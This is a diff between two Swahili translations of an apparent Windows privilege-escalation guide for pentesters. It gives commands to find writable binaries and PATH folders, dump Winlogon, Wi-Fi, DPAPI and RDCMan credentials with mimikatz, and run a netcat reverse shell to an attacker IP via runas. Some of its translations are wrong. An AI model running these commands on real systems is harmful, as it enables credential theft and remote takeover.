-Windows inaruhusu watumiaji kuweka hatua za kuchukuliwa ikiwa huduma inashindwa. Kipengele hiki kinaweza kusanidiwa kuashiria kwa faili ya binary. Ikiwa faili hii ya binary inaweza kubadilishwa, inawezekana kufanya upandishaji wa haki za mtumiaji. Maelezo zaidi yanaweza kupatikana katika [hati rasmi](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN).
+Windows inaruhusu watumiaji kuteua hatua zitakazochukuliwa ikiwa huduma itashindwa. Kipengele hiki kinaweza kusanidiwa kuashiria kwenye faili ya binary. Ikiwa faili hii ya binary inaweza kubadilishwa, inawezekana kufanya upandishaji wa mamlaka. Maelezo zaidi yanaweza kupatikana katika [hati rasmi](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN).
 
-## Programu
+## Matumizi
 
-### Programu Zilizosakinishwa
+### Matumizi Yaliyosakinishwa
 
-Angalia **ruhusa za faili za binary** (labda unaweza kubadilisha moja na kupandisha haki za mtumiaji) na **folda** ([DLL Hijacking](dll-hijacking.md)).
+Angalia **ruhusa za faili za binary** (labda unaweza kuzibadilisha moja na kupandisha mamlaka) na **folda** ([Udukuzi wa DLL](dll-hijacking.md)).
 ```bash
 dir /a "C:\Program Files"
 dir /a "C:\Program Files (x86)"
@@ -777,9 +571,9 @@ reg query HKEY_LOCAL_MACHINE\SOFTWARE
 Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
 Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
 ```
-### Ruhusa za Kuandika
+### Uandishi wa Ruhusa
 
-Angalia ikiwa unaweza kubadilisha faili ya usanidi ili kusoma faili maalum au ikiwa unaweza kubadilisha faili ya binary ambayo itatekelezwa na akaunti ya Msimamizi (schedtasks).
+Angalia ikiwa unaweza kuhariri faili ya usanidi ili kusoma faili maalum au ikiwa unaweza kuhariri faili fulani ya binary ambayo itatekelezwa na akaunti ya Msimamizi (schedtasks).
 
 Njia ya kupata ruhusa dhaifu za folda/faili katika mfumo ni kufanya:
 ```bash
@@ -807,7 +601,7 @@ Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Ac
 ### Kukimbia wakati wa kuanza
 
 **Angalia kama unaweza kubadilisha usajili au faili ya binary ambayo itatekelezwa na mtumiaji tofauti.**\
-**Soma** **ukurasa ufuatao** ili kujifunza zaidi kuhusu maeneo ya kuvutia ya **kupandisha haki za mtumiaji kwa kutumia autoruns**:
+**Soma** ukurasa **ifuatayo** ili kujifunza zaidi kuhusu **maeneo ya kuanza moja kwa moja ya kuvutia ya kuinua upendeleo**:
 
 {% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
 [privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
@@ -815,7 +609,7 @@ Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Ac
 
 ### Madereva
 
-Tafuta **madereva ya tatu yasiyo ya kawaida/hatarishi**
+Tafuta **madereva ya tatu ya ajabu/hatarishi** yanayowezekana
 ```bash
 driverquery
 driverquery.exe /fo table
@@ -823,9 +617,9 @@ driverquery /SI
 ```
 ## PATH DLL Hijacking
 
-Ikiwa una **ruhusa ya kuandika ndani ya folda iliyopo kwenye PATH**, unaweza kuweza kuteka DLL iliyopakiwa na mchakato na **kuongeza mamlaka**.
+Ikiwa una **ruhusa ya kuandika ndani ya folda iliyopo kwenye PATH** unaweza kuweza kuteka DLL inayopakiwa na mchakato na **kupandisha vyeo**.
 
-Angalia ruhusa za folda zote zilizopo kwenye PATH:
+Angalia ruhusa za folda zote ndani ya PATH:
 ```bash
 for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
 ```
@@ -837,7 +631,7 @@ Kwa habari zaidi kuhusu jinsi ya kutumia hii angalia:
 
 ## Mtandao
 
-### Kugawana
+### Hisa
 ```bash
 net view #Get a list of computers
 net view /all /domain [domainname] #Shares on the domains
@@ -845,93 +639,61 @@ net view \\computer /ALL #List shares of a computer
 net use x: \\computer\share #Mount the share locally
 net share #Check current shares
 ```
-### Faili la wenyeji
+### faili ya wenyeji
 
-Angalia kompyuta nyingine zinazojulikana zilizowekwa kwa nguvu kwenye faili ya wenyeji
+Angalia kompyuta zingine zinazojulikana zilizowekwa kwa nguvu kwenye faili ya wenyeji
 ```
 type C:\Windows\System32\drivers\etc\hosts
 ```
-### Vifaa vya Mtandao na DNS
-
-#### Network Interfaces (Vifaa vya Mtandao)
-
-Vifaa vya mtandao ni sehemu muhimu ya mazingira ya mtandao. Wanaruhusu kompyuta kuwasiliana na mtandao na kubadilishana data. Kuna aina tofauti za vifaa vya mtandao, kama vile kadi za mtandao, modemu, na router.
-
-Kadi za mtandao ni vifaa ambavyo hushughulikia uhusiano wa kimwili kati ya kompyuta na mtandao. Wanawezesha kompyuta kuunganishwa na mtandao kupitia waya au teknolojia ya wireless.
-
-Modemu ni kifaa kinachotumiwa kuunganisha kompyuta na mtandao wa kampuni ya huduma ya mtandao (ISP). Inabadilisha ishara za dijiti kutoka kwa kompyuta kuwa ishara za analog ambazo zinaweza kusafiri kupitia mtandao.
-
-Routers ni vifaa ambavyo husambaza trafiki ya mtandao kati ya vifaa vya mtandao. Wanaruhusu kompyuta kuwasiliana na vifaa vingine kwenye mtandao na kusambaza data kwa usahihi.
-
-#### DNS (Domain Name System)
-
-DNS ni mfumo unaotumiwa kutafsiri majina ya kikoa kuwa anwani za IP. Anwani za IP ni nambari zinazotumiwa kwa kila kifaa kwenye mtandao ili kuwasiliana na vifaa vingine. DNS inaruhusu watumiaji kutumia majina ya kikoa kama "www.example.com" badala ya kujua anwani ya IP ya kifaa kinachohusika.
-
-Mfumo wa DNS una seva za DNS ambazo hushughulikia ombi la kutafsiri jina la kikoa. Seva hizi zinahifadhi rekodi za DNS ambazo zinaonyesha uhusiano kati ya majina ya kikoa na anwani za IP. Wakati mtumiaji anapoomba kutafsiri jina la kikoa, kompyuta yake inawasiliana na seva ya DNS ili kupata anwani ya IP inayohusiana na jina la kikoa.
-
-Kwa mfano, wakati unapoingia "www.example.com" kwenye kivinjari chako, kivinjari kinawasiliana na seva ya DNS ili kupata anwani ya IP ya "www.example.com". Mara tu anwani ya IP inapopatikana, kivinjari kinaweza kuwasiliana moja kwa moja na kifaa kinachohusika kwenye mtandao.
+### Vifaa vya Mtandao & DNS
 ```
 ipconfig /all
 Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
 Get-DnsClientServerAddress -AddressFamily IPv4 | ft
 ```
-### Bandari Zilizofunguliwa
+### Milango Wazi
 
-Angalia huduma **zilizozuiwa** kutoka nje
+Angalia **huduma zilizozuiliwa** kutoka nje
 ```bash
 netstat -ano #Opened ports?
 ```
-### Jedwali la Utekelezaji
-
-Jedwali la utekelezaji ni orodha ya maelekezo ambayo kompyuta hutumia kuamua njia bora ya kusafirisha data kati ya mitandao tofauti. Kila maelekezo katika jedwali la utekelezaji lina habari kuhusu anwani ya IP ya marudio, anwani ya IP ya lango, na kifaa cha mtandao kinachotumiwa kusafirisha data.
-
-Kwa kawaida, kompyuta ina jedwali la utekelezaji la ndani ambalo linajumuisha maelekezo ya msingi ya kusafirisha data kwenye mtandao wa ndani. Hata hivyo, inaweza pia kuwa na jedwali la utekelezaji la nje ambalo linajumuisha maelekezo ya kusafirisha data kwenye mitandao ya nje.
-
-Kwa mfano, ikiwa kompyuta inataka kusafirisha data kwa anwani ya IP ya marudio, itatafuta maelekezo katika jedwali la utekelezaji ili kuamua njia bora ya kufikia marudio hayo. Ikiwa maelekezo yanapatikana, kompyuta itatumia lango lililoorodheshwa katika maelekezo hayo kusafirisha data.
+### Jedwali la Uelekezaji
 ```
 route print
 Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
 ```
-### Orodha ya ARP
-
-ARP (Address Resolution Protocol) ni itifaki inayotumiwa kwenye mitandao ya kompyuta kubadilishana anwani za IP na anwani za MAC. Orodha ya ARP ina habari kuhusu uhusiano kati ya anwani za IP na anwani za MAC kwenye mtandao.
-
-Kwa kawaida, kifaa kinapowasiliana na kifaa kingine kwenye mtandao, kinahitaji anwani ya MAC ya kifaa hicho ili kuwasiliana nayo. Kifaa kinachotaka kuwasiliana na kifaa kingine kinatafuta anwani ya MAC kwenye orodha ya ARP. Ikiwa anwani ya MAC haipo kwenye orodha ya ARP, kifaa kinatumia ARP kugundua anwani ya MAC ya kifaa kingine.
-
-Orodha ya ARP inaweza kuwa muhimu kwa mchakato wa kuboresha uwezo wa kifaa cha kudukua. Kwa kudukua orodha ya ARP, mtu anaweza kubadilisha habari kwenye orodha hiyo ili kufanya mashambulizi ya kudukua.
-
-Kwa hiyo, ni muhimu kwa wataalamu wa usalama wa mtandao kufahamu jinsi ya kusoma na kudukua orodha ya ARP ili kuzuia mashambulizi ya kudukua.
+### Jedwali la ARP
 ```
 arp -A
 Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
 ```
-### Mipangilio ya Firewall
+### Mipangilio ya Kizuizi cha Moto
 
-[**Angalia ukurasa huu kwa amri za Firewall**](../basic-cmd-for-pentesters.md#firewall) **(orodha ya mipangilio, kuunda mipangilio, kuzima, kuzima...)**
+[**Angalia ukurasa huu kwa amri zinazohusiana na Kizuizi cha Moto**](../basic-cmd-for-pentesters.md#firewall) **(orodha ya sheria, unda sheria, zima, zima...)**
 
-Zaidi [amri za uchunguzi wa mtandao hapa](../basic-cmd-for-pentesters.md#network)
+Zaidi[ amri za uchunguzi wa mtandao hapa](../basic-cmd-for-pentesters.md#network)
 
 ### Windows Subsystem for Linux (wsl)
 ```bash
 C:\Windows\System32\bash.exe
 C:\Windows\System32\wsl.exe
 ```
-Binary `bash.exe` pia inaweza kupatikana katika `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`
+Binary `bash.exe` inaweza pia kupatikana katika `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`
 
-Ikiwa unapata mtumiaji wa mizizi, unaweza kusikiliza kwenye bandari yoyote (wakati wa kwanza unapotumia `nc.exe` kusikiliza kwenye bandari, itauliza kupitia GUI ikiwa `nc` inapaswa kuruhusiwa na firewall).
+Ukipata mtumiaji wa mzizi unaweza kusikiliza kwenye bandari yoyote (wakati wa kwanza unapotumia `nc.exe` kusikiliza kwenye bandari itauliza kupitia GUI ikiwa `nc` inapaswa kuruhusiwa na firewall).
 ```bash
 wsl whoami
 ./ubuntun1604.exe config --default-user root
 wsl whoami
 wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
 ```
-Kuanza bash kama root kwa urahisi, unaweza kujaribu `--default-user root`
+Kuanza bash kama root kwa urahisi, unaweza jaribu `--default-user root`
 
-Unaweza kuchunguza mfumo wa faili wa `WSL` katika folda `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`
+Unaweza kuchunguza mfumo wa faili wa `WSL` kwenye folda `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`
 
-## Vitambulisho vya Windows
+## Sifa za Windows
 
-### Vitambulisho vya Winlogon
+### Sifa za Winlogon
 ```bash
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"
 
@@ -943,16 +705,16 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDef
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
 ```
-### Meneja wa Vitambulisho / Hazina ya Windows
+### Meneja wa Vyeti / Ghala la Windows
 
 Kutoka [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
-Hazina ya Windows inahifadhi vitambulisho vya mtumiaji kwa seva, tovuti, na programu nyingine ambazo **Windows** inaweza **kuingia kiotomatiki** kwa niaba ya watumiaji. Kwa mara ya kwanza, inaweza kuonekana kama watumiaji wanaweza kuhifadhi vitambulisho vyao vya Facebook, vitambulisho vya Twitter, vitambulisho vya Gmail, nk., ili waweze kuingia kiotomatiki kupitia vivinjari. Lakini sivyo ilivyo.
+Ghala la Windows hifadhi vyeo vya mtumiaji kwa ajili ya seva, tovuti na programu nyingine ambazo **Windows** inaweza **kuingia kiotomatiki** kwa niaba ya watumiaji. Kwa mara ya kwanza, hii inaweza kuonekana kama watumiaji wanaweza kuhifadhi vyeo vyao vya Facebook, Twitter, Gmail n.k., ili kuingia kiotomatiki kupitia vivinjari. Lakini sivyo.
 
-Hazina ya Windows inahifadhi vitambulisho ambavyo Windows inaweza kuingia kiotomatiki kwa niaba ya watumiaji, ambayo inamaanisha kwamba **programu yoyote ya Windows inayohitaji vitambulisho kufikia rasilimali** (seva au tovuti) **inaweza kutumia Meneja wa Vitambulisho** na Hazina ya Windows na kutumia vitambulisho vilivyotolewa badala ya watumiaji kuingiza jina la mtumiaji na nenosiri kila wakati.
+Ghala la Windows hifadhi vyeo ambavyo Windows inaweza kuingia kiotomatiki kwa niaba ya watumiaji, hii inamaanisha kwamba **programu yoyote ya Windows inayohitaji vyeo kufikia rasilimali** (seva au tovuti) **inaweza kutumia Meneja wa Vyeti & Ghala la Windows** na kutumia vyeo vilivyotolewa badala ya watumiaji kuingiza jina la mtumiaji na nywila kila wakati.
 
-Isipokuwa programu zinashirikiana na Meneja wa Vitambulisho, sidhani kuwa ni rahisi kwao kutumia vitambulisho kwa rasilimali iliyotolewa. Kwa hivyo, ikiwa programu yako inataka kutumia hazina, inapaswa somehow **kuwasiliana na meneja wa vitambulisho na kuomba vitambulisho kwa rasilimali hiyo** kutoka kwenye hazina ya uhifadhi ya chaguo-msingi.
+Isipokuwa programu zinashirikiana na Meneja wa Vyeti, nadhani haiwezekani kwao kutumia vyeo kwa rasilimali iliyotolewa. Kwa hivyo, ikiwa programu yako inataka kutumia ghala, inapaswa kwa njia fulani **kuwasiliana na meneja wa vyeti na kuomba vyeo kwa rasilimali hiyo** kutoka kwenye ghala la kuhifadhi la msingi.
 
-Tumia `cmdkey` kuorodhesha vitambulisho vilivyohifadhiwa kwenye kifaa.
+Tumia `cmdkey` kuorodhesha vyeo vilivyohifadhiwa kwenye mashine.
 ```bash
 cmdkey /list
 Currently stored credentials:
@@ -960,48 +722,48 @@ Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
 ```
-Kisha unaweza kutumia `runas` na chaguo la `/savecred` ili kutumia vibali vilivyohifadhiwa. Mfano ufuatao unaita faili ya mbali kupitia sehemu ya SMB.
+Kisha unaweza kutumia `runas` na chaguo la `/savecred` ili kutumia sifa zilizohifadhiwa. Mfano ufuatao unaita faili ya mbali kupitia sehemu ya SMB.
 ```bash
 runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
 ```
-Kutumia `runas` na seti ya sifa zilizotolewa.
+Kutumia `runas` na seti ya maelezo ya uthibitishaji iliyotolewa.
 ```bash
 C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
 ```
-Tafadhali kumbuka kuwa mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html), au kutoka [Moduli ya Powershells ya Empire](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1).
+Tafadhali kumbuka kwamba mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html), au kutoka [Moduli ya Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1).
 
 ### DPAPI
 
-**Data Protection API (DPAPI)** hutoa njia ya kusimbwa data kwa kutumia njia ya kusimbwa kwa usawa, inayotumiwa sana ndani ya mfumo wa uendeshaji wa Windows kwa kusimbwa kwa usawa wa funguo za kibinafsi zisizo sawa. Kusimbwa huku kunatumia siri ya mtumiaji au mfumo ili kuchangia kwa kiasi kikubwa kwenye entropy.
+**Kioo cha Data Protection API (DPAPI)** hutoa njia ya encryption ya symmetric ya data, kwa kiasi kikubwa hutumiwa ndani ya mfumo wa uendeshaji wa Windows kwa encryption symmetric ya funguo za asymmetric private. Encryption hii hutumia siri ya mtumiaji au mfumo kuchangia kwa kiasi kikubwa kwenye entropy.
 
-**DPAPI inawezesha kusimbwa kwa funguo kupitia funguo za usawa zinazotokana na siri za kuingia za mtumiaji**. Katika mazingira yanayohusisha kusimbwa kwa mfumo, inatumia siri za uwakilishi wa kikoa cha mfumo.
+**DPAPI inawezesha encryption ya funguo kupitia funguo symmetric ambalo linatokana na siri za kuingia za mtumiaji**. Katika mazingira yanayohusisha encryption ya mfumo, inatumia siri za uthibitishaji wa kikoa cha mfumo.
 
-Funguo za RSA za mtumiaji zilizosimbwa, kwa kutumia DPAPI, zimehifadhiwa kwenye saraka ya `%APPDATA%\Microsoft\Protect\{SID}`, ambapo `{SID}` inawakilisha [Kitambulisho cha Usalama](https://en.wikipedia.org/wiki/Security\_Identifier) cha mtumiaji. **Funguo la DPAPI, lililoshirikishwa na funguo kuu linalolinda funguo za kibinafsi za mtumiaji kwenye faili ile ile**, kwa kawaida linaundwa na data ya kubahatisha ya bajeti 64. (Ni muhimu kutambua kuwa ufikiaji wa saraka hii umefungwa, kuzuia orodha ya maudhui yake kupitia amri ya `dir` kwenye CMD, ingawa inaweza kuorodheshwa kupitia PowerShell).
+Funguo za RSA za mtumiaji zilizo encrypted, kwa kutumia DPAPI, hifadhiwa kwenye saraka `%APPDATA%\Microsoft\Protect\{SID}`, ambapo `{SID}` inawakilisha [Kitambulisho cha Usalama](https://en.wikipedia.org/wiki/Security\_Identifier) cha mtumiaji. **Funguo la DPAPI, lililoko pamoja na funguo kuu linalolinda funguo za kibinafsi za mtumiaji kwenye faili moja**, kwa kawaida lina byte 64 za data za random. (Ni muhimu kutambua kwamba upatikanaji wa saraka hii umefungwa, kuzuia orodha ya maudhui yake kupitia amri ya `dir` kwenye CMD, ingawa inaweza kuorodheshwa kupitia PowerShell).
 ```powershell
 Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
 Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
 ```
-Unaweza kutumia **moduli ya mimikatz** `dpapi::masterkey` na hoja sahihi (`/pvk` au `/rpc`) ili kuidondoa.
+Unaweza kutumia **moduli ya mimikatz** `dpapi::masterkey` pamoja na hoja sahihi (`/pvk` au `/rpc`) kuidondoa.
 
-Faili za **vyeti zilizolindwa na nenosiri kuu** kawaida zipo katika:
+**Faili za siri zilizolindwa na nenosiri kuu** kawaida zipo katika:
 ```powershell
 dir C:\Users\username\AppData\Local\Microsoft\Credentials\
 dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 ```
-Unaweza kutumia moduli ya **mimikatz** `dpapi::cred` na `/masterkey` sahihi ili kufichua.\
-Unaweza **kuchukua DPAPI nyingi** za **masterkeys** kutoka **kumbukumbu** kwa kutumia moduli ya `sekurlsa::dpapi` (ikiwa wewe ni mtumiaji mkuu).
+Unaweza kutumia **moduli ya mimikatz** `dpapi::cred` na `/masterkey` sahihi kufichua.\
+Unaweza **kuchimbua DPAPI nyingi** **masterkeys** kutoka **kumbukumbu** kwa kutumia moduli ya `sekurlsa::dpapi` (ikiwa wewe ni root).
 
 {% content-ref url="dpapi-extracting-passwords.md" %}
 [dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
 {% endcontent-ref %}
 
-### Vitambulisho vya PowerShell
+### Sifa za PowerShell
 
-**Vitambulisho vya PowerShell** mara nyingi hutumiwa kwa **scripting** na kazi za otomatiki kama njia ya kuhifadhi vitambulisho vilivyofichwa kwa urahisi. Vitambulisho hivyo vinalindwa kwa kutumia **DPAPI**, ambayo kwa kawaida inamaanisha kuwa vinaweza kufichuliwa tu na mtumiaji huyo huyo kwenye kompyuta hiyo hiyo ambayo viliumbwa.
+**Sifa za PowerShell** mara nyingi hutumiwa kwa **scripting** na kazi za kiotomatiki kama njia ya kuhifadhi sifa zilizofichwa kwa urahisi. Sifa hizo zinalindwa kwa kutumia **DPAPI**, ambayo kwa kawaida inamaanisha zinaweza kufichuliwa tu na mtumiaji huyo huyo kwenye kompyuta ile ile zilizoundwa.
 
-Ili **kufichua** vitambulisho vya PS kutoka kwenye faili inayovihifadhi, unaweza kufanya yafuatayo:
+Kufichua sifa za PS kutoka kwenye faili inayozihifadhi unaweza kufanya hivi:
 ```powershell
 PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
 PS C:\> $credential.GetNetworkCredential().username
@@ -1014,40 +776,7 @@ JustAPWD!
 ```
 ### Wifi
 
-#### Introduction
-
-Wifi is a wireless technology that allows devices to connect to the internet or other networks without the need for physical cables. It is commonly used in homes, offices, and public places to provide internet access to multiple devices simultaneously.
-
-#### How Wifi Works
-
-Wifi works by using radio waves to transmit data between devices. A wireless router acts as the central hub, transmitting and receiving data from connected devices. When a device wants to connect to a wifi network, it sends a request to the router, which then authenticates the device and assigns it an IP address. Once connected, the device can send and receive data over the network.
-
-#### Wifi Security
-
-Wifi networks can be secured using various security protocols, such as WEP, WPA, and WPA2. These protocols encrypt the data being transmitted over the network, making it difficult for unauthorized users to intercept and access the data. It is important to use strong passwords and regularly update the wifi network's security settings to protect against potential security breaches.
-
-#### Common Wifi Attacks
-
-Despite the security measures in place, wifi networks can still be vulnerable to various attacks. Some common wifi attacks include:
-
-- **Brute Force Attack**: This involves attempting to guess the wifi network's password by systematically trying all possible combinations until the correct one is found.
-- **Dictionary Attack**: Similar to a brute force attack, but instead of trying all possible combinations, it uses a pre-generated list of commonly used passwords.
-- **Man-in-the-Middle Attack**: In this attack, an attacker intercepts the communication between a device and the wifi network, allowing them to eavesdrop on the data being transmitted.
-- **Evil Twin Attack**: This involves creating a fake wifi network with the same name as a legitimate network, tricking users into connecting to it and potentially exposing their data.
-- **WPS Attack**: Some wifi routers have a feature called Wi-Fi Protected Setup (WPS), which allows users to easily connect to the network. However, this feature can be exploited by attackers to gain unauthorized access to the network.
-
-#### Wifi Best Practices
-
-To enhance the security of your wifi network, consider following these best practices:
-
-- Use a strong, unique password for your wifi network.
-- Regularly update your router's firmware to ensure it has the latest security patches.
-- Disable WPS if it is not needed.
-- Enable network encryption (WPA2 or higher) to protect the data being transmitted over the network.
-- Change the default SSID (network name) of your wifi network to something unique.
-- Disable remote administration of your router to prevent unauthorized access.
-
-By following these best practices, you can significantly reduce the risk of unauthorized access to your wifi network and protect your data from potential attacks.
+### Wifi
 ```bash
 #List saved Wifi using
 netsh wlan show profile
@@ -1056,7 +785,7 @@ netsh wlan show profile <SSID> key=clear
 #Oneliner to extract all wifi passwords
 cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
 ```
-### Kumbukumbu za Uunganisho wa RDP Uliohifadhiwa
+### Ushirikiano wa RDP Uliohifadhiwa
 
 Unaweza kuzipata kwenye `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
 na kwenye `HKCU\Software\Microsoft\Terminal Server Client\Servers\`
@@ -1066,31 +795,24 @@ na kwenye `HKCU\Software\Microsoft\Terminal Server Client\Servers\`
 HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
 HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
 ```
-### **Meneja wa Vitambulisho vya Kuingia Kijijini**
-
-- On Windows systems, the Remote Desktop Credential Manager is a feature that allows users to save their login credentials for remote desktop connections.
-- Kwenye mifumo ya Windows, Meneja wa Vitambulisho vya Kuingia Kijijini ni kipengele kinachowezesha watumiaji kuokoa vitambulisho vyao vya kuingia kwa ajili ya uunganisho wa kijijini wa desktop.
-
-- These credentials are stored in the Windows Credential Manager, which is a secure storage area for usernames and passwords.
-- Vitambulisho hivi hifadhiwa katika Meneja wa Vitambulisho wa Windows, ambao ni eneo salama la kuhifadhi majina ya watumiaji na nywila.
-
-- As a hacker, you can target the Remote Desktop Credential Manager to gain access to these saved credentials and potentially escalate your privileges.
-- Kama mhalifu wa mtandao, unaweza kulenga Meneja wa Vitambulisho vya Kuingia Kijijini ili kupata ufikiaji wa vitambulisho vilivyohifadhiwa na huenda kuongeza haki zako.
-
-- There are various techniques you can use to exploit this feature, such as using a keylogger or extracting the credentials from the Windows registry.
-- Kuna njia mbalimbali unazoweza kutumia kudukua kipengele hiki, kama vile kutumia keylogger au kuchukua vitambulisho kutoka kwenye rejista ya Windows.
-
-- It is important to note that exploiting the Remote Desktop Credential Manager is illegal and unethical unless you have proper authorization to do so.
-- Ni muhimu kuzingatia kwamba kudukua Meneja wa Vitambulisho vya Kuingia Kijijini ni kinyume cha sheria na si maadili isipokuwa una idhini sahihi ya kufanya hivyo.
+### **Meneja wa Vitambulisho vya Kijijini**
 ```
 %localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
 ```
-Tumia moduli ya **Mimikatz** `dpapi::rdg` na `/masterkey` sahihi ku **kufichua faili za .rdg**\
-Unaweza **kuchimbua DPAPI masterkeys nyingi** kutoka kumbukumbu kwa kutumia moduli ya Mimikatz `sekurlsa::dpapi`
+Tumia moduli ya **Mimikatz** `dpapi::rdg` na `/masterkey` sahihi kwa **kudekripta faili za .rdg**\
+Unaweza **kutoa masterkeys nyingi za DPAPI** kutoka kumbukumbu na moduli ya Mimikatz `sekurlsa::dpapi`
 
-### Noti za Kufunga
+### Noti za Kukumbuka
 
-Wat
+Watoto mara nyingi hutumia programu ya StickyNotes kwenye vituo vya kazi vya Windows kuokoa **manenosiri** na habari nyingine, bila kufahamu kuwa ni faili ya database. Faili hii iko kwenye `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` na ni vyema kuitafuta na kuichunguza.
+
+### AppCmd.exe
+
+**Tafadhali kumbuka kuwa ili kupata nywila kutoka kwa AppCmd.exe unahitaji kuwa Msimamizi na kukimbia chini ya kiwango cha Juu cha Uadilifu.**\
+**AppCmd.exe** iko katika saraka ya `%systemroot%\system32\inetsrv\`.\
+Ikiwa faili hii ipo, basi kuna uwezekano kwamba baadhi ya **siri** zimeundwa na zinaweza **kupatikana**.
+
+Msimbo huu ulichimbuliwa kutoka kwenye [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
 ```bash
 function Get-ApplicationHost {
 $OrigError = $ErrorActionPreference
@@ -1170,67 +892,41 @@ $ErrorActionPreference = $OrigError
 ```
 ### SCClient / SCCM
 
-Angalia ikiwa `C:\Windows\CCM\SCClient.exe` ipo.\
-Wakati wa kufunga programu, inatekelezwa kwa **mamlaka ya SYSTEM**, nyingi zinaweza kuwa na udhaifu wa **DLL Sideloading (Maelezo kutoka** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
+Angalia kama `C:\Windows\CCM\SCClient.exe` ipo.\
+Wakati wa kufunga, **zinaendeshwa na mamlaka ya SYSTEM**, wengi wao ni dhaifu kwa **DLL Sideloading (Maelezo kutoka** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
 ```bash
 $result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
 if ($result) { $result }
 else { Write "Not Installed." }
 ```
-## Faili na Usajili (Majina ya Utambulisho)
+## Faili na Usajili (Siri)
 
-### Vyeti vya Putty
-
-```plaintext
-Putty stores its credentials in the Windows registry under the following key:
-
-HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions
-
-Each session created in Putty is stored as a subkey under the "Sessions" key. The session subkeys contain values for the session configuration, including the username and password used for authentication.
-
-To extract the credentials, you can navigate to the "Sessions" key in the registry and look for the desired session subkey. The username and password values can be found within the subkey's values.
-
-It's important to note that the passwords stored in the registry are encrypted. However, there are tools available that can decrypt these passwords, such as "Mimikatz" or "LaZagne".
-
-Keep in mind that extracting credentials from the registry may be considered illegal or unethical without proper authorization. Always ensure you have the necessary permissions and legal rights before attempting any actions.
+### Putty Creds
 ```bash
 reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
 ```
-### Vichimbakazi vya Wenyeji wa Putty SSH
-
